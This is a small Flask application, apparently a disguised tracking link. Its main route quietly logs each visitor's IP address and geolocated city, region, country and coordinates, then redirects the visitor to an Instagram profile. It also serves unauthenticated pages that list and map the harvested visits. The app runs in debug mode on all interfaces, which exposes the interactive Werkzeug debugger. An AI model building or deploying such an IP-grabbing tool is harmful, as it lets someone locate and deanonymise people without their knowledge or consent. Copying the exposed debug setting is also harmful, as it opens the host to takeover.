from flask import Flask, request, redirect, jsonify, render_template
import requests

app = Flask(__name__)
acessos = []

@app.route('/')
def redirecionar():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    try:
        geo_info = requests.get(f'https://ipinfo.io/{ip}/json').json()
        loc = geo_info.get('loc', '')
        lat, lon = map(float, loc.split(',')) if loc else (0.0, 0.0)
    except:
        lat, lon = 0.0, 0.0
        geo_info = {}

    # Armazenar dados
    acessos.append({
        'ip': ip,
        'lat': lat,
        'lon': lon,
        'city': geo_info.get('city', 'Desconhecida'),
        'region': geo_info.get('region', 'Desconhecida'),
        'country': geo_info.get('country', 'Desconhecido')
    })

    return redirect("https://www.instagram.com/mateusflorenzano?igsh=ZmF5a2UyNml3Nmc0", code=302)

@app.route('/acessos')
def mostrar_acessos():
    return render_template("acessos.html", acessos=acessos)

@app.route('/mapa')
def exibir_mapa():
    return render_template("mapa.html", acessos=acessos)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5002)
